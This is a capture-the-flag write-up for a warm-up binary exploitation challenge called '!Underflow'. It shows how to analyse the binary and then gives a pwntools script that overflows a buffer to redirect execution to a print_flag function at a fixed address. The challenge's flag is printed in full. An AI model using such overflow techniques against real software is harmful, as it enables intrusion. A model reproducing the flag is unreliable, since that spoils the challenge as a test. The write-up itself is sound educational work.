# !Underflow  

**Category:** Binary Exploitation  

A simple warm-up challenge to get started with binary exploitation.  

---

### Challenge  

**Provided File:** `exploit-me`  

---

## Overview  

1. **Analyzing the Binary**  
   - Use `file exploit-me` to check the binary type.  
   - Run `strings exploit-me` to check for any readable text inside.  
   - Load the binary in **IDA Pro** or **Ghidra** to reverse-engineer its logic.  

2. **Finding the Flag Function**  
   - Decompiling the binary reveals a function called `print_flag`, which directly prints the flag:  
     ```c
     int print_flag()
     {
       return printf("%s", "ACECTF{buff3r_0v3rfl3w}");
     }
     ```
   - This means the goal is to redirect execution to `print_flag`.  

3. **Exploiting Buffer Overflow**  
   - The program has a buffer overflow vulnerability that allows overwriting the return address.  
   - By crafting a payload to overwrite the return address with the address of `print_flag`, we can trigger the function execution.  

---

## Steps to Exploit  

1. **Check Binary Properties**  
   ```sh
   file exploit-me  
   checksec --file=exploit-me  
   strings exploit-me  
   ```

2. **Find the Flag Function**  
   - Decompile `print_flag` in **IDA Pro** or **Ghidra**.  

3. **Construct Overflow Payload**  
   - Determine the buffer overflow offset using `cyclic` from `pwntools`.  
   - Overwrite the return address with `0x401156` (address of `print_flag`).  

---

## Exploit Script  

```python
from pwn import *

binary = './exploit-me'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)

r.sendline(flat([
    cyclic(64),  # Overflow buffer
    cyclic(8),   # Overwrite saved RBP
    p64(0x401156)  # Address of print_flag
]))

r.interactive()
```
